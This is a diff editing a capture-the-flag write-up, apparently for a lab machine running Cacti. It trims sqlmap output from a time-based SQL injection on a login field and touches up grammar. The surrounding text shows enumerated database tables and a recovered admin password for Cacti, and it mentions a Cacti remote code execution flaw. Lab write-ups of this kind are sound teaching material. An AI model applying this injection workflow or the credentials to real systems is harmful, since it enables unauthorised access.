@@ -337,11 +337,7 @@ Parameter: username (POST)
 web server operating system: Linux Ubuntu
 web application technology: Nginx 1.18.0
 back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
-[20:49:13] [INFO] fetching database names
-[20:49:13] [INFO] fetching number of databases
-[20:49:13] [INFO] resumed: 2
-[20:49:13] [INFO] resumed: information_schema
-[20:49:13] [INFO] resumed: monitorsthree_db
+
 available databases [2]:
 [*] information_schema
 [*] monitorsthree_db
@@ -388,21 +384,7 @@ Parameter: username (POST)
 web server operating system: Linux Ubuntu
 web application technology: Nginx 1.18.0
 back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
-[20:52:29] [INFO] fetching tables for database: 'monitorsthree_db'
-[20:52:29] [INFO] fetching number of tables for database 'monitorsthree_db'
-[20:52:29] [INFO] resumed: 6
-[20:52:29] [INFO] resumed: invoices
-[20:52:29] [INFO] resumed: customers
-[20:52:29] [INFO] resumed: changelog
-[20:52:29] [INFO] resumed: tasks
-[20:52:29] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                        
-[20:52:38] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
-do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
-[20:53:55] [INFO] adjusting time delay to 1 second due to good response times
-invoice_ta
-[20:57:01] [ERROR] invalid character detected. retrying..
-[20:57:01] [WARNING] increasing time delay to 2 seconds
-sks
+...[snip]...
 [20:58:38] [INFO] retrieved: users
 Database: monitorsthree_db
 [6 tables]
@@ -424,7 +406,7 @@ Database: monitorsthree_db
 
 We have 6 `tables`. 
 
-We will dump the `users` table:
+We will dump the `users` one:
 
 <br />
 
@@ -462,6 +444,6 @@ This password works for the Cacti login -> `admin/greencacti2001`
 
 <br />
 
-If we remember, before exploit the `SQL Injection`, we have founded a `RCE` in this Cacti version.
+If we remember, before exploiting the `SQL Injection`, we had found an `RCE` vulnerability in this Cacti version.
 
 <br />
